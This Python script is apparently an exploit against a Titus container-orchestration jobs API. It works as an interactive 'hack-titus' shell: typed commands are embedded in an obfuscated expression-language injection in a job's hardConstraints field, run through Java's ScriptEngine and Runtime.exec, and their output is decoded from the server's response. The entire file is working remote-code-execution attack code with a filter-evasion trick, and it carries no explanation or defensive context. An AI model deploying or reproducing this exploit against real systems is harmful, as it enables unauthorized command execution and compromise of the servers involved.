#!/usr/bin/env python
import requests
import readline

class AutoCompleter(object):  # Custom completer

    def __init__(self, options):
        self.options = sorted(options)

    def complete(self, text, state):
        if state == 0:  # on first trigger, build possible matches
            if text:  # cache matches (entries that start with entered text)
                self.matches = [s for s in self.options 
                                    if s and s.startswith(text)]
            else:  # no text entered, all matches possible
                self.matches = self.options[:]

        # return match indexed by state
        try: 
            return self.matches[state]
        except IndexError:
            return None

autocomplete = AutoCompleter([])
readline.set_completer(autocomplete.complete)
readline.parse_and_bind('tab: complete')


url = "http://localhost:7001/api/v3/jobs"

def fix_command(c):
	out = ""
	for i in c:
		if i >= 'A' and i <= 'Z':
			out += '\' + \'a\'.replace(\'a\', %d) + \'' % ord(i)
		else:
			out += i
	return out

try:
	while True:
		command = input("\033[92mhack-titus\033[0m $ ")
		payload = "{\n    \"applicationName\": \"myApp\",\n    \"owner\": {\n        \"teamEmail\": \"hello@gmail.com\"\n    },\n    \"container\": {\n        \"resources\": {\n            \"cpu\": 1,\n            \"memoryMB\": 128,\n            \"diskMB\": 128,\n            \"networkMbps\": 1\n        },\n        \"securityProfile\": {\"iamRole\": \"test-role\", \"securityGroups\": [\"sg-test\"]},\n        \"image\": {\n            \"name\": \"ubuntu\",\n            \"tag\": \"xenial\"\n        },\n        \"softConstraints\": {\n        },\n        \"hardConstraints\": {\n            \"constraints\": {\n                \"#{''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')).class.methods[1].invoke(''.class.class.methods[14].invoke(''.class.class.methods[0].invoke(''.class, 'javax.script.' + 'a'.replace('a', 83) + 'cript' + 'a'.replace('a', 69) + 'ngine' + 'a'.replace('a', 77) + 'anager')), 'js').compile('x = java.lang.' + 'a'.replace('a', 82) +  'untime.get' + 'a'.replace('a', 82) + 'untime().exec(\\\"%s\\\"); stdin = x.get'+'a'.replace('a', 73)+'nput'+'a'.replace('a', 83)+'tream(); s = '+'a'.replace('a', 83)+'tring(); while((y = stdin.read()) != -1) { s += y; s += \\\",\\\";} s').eval() + ''}\": \"lol\"\n            }\n        }\n    },\n    \"service\": {\n        \"capacity\": {\n            \"min\": 1,\n            \"max\": 1,\n            \"desired\": 1\n        },\n        \"retryPolicy\": {\n            \"immediate\": {\n                \"retries\": 10\n            }\n        }\n    }\n}" % fix_command(command)
		headers = {
		  'Content-Type': 'application/json',
		  'Accept': 'application/json',
		  'Content-Type': 'application/json'
		}

		response = requests.request("POST", url, headers=headers, data = payload)

		try:
			idx = response.text.index('[')
			idx2 = response.text.index(']')
			s = response.text[idx+1:idx2-1]
			for i in s.split(','):
				print(chr(int(i)), end='')
		except Exception as e:
			print("invalid response from server")

except KeyboardInterrupt as e:
	print()
	exit(0)

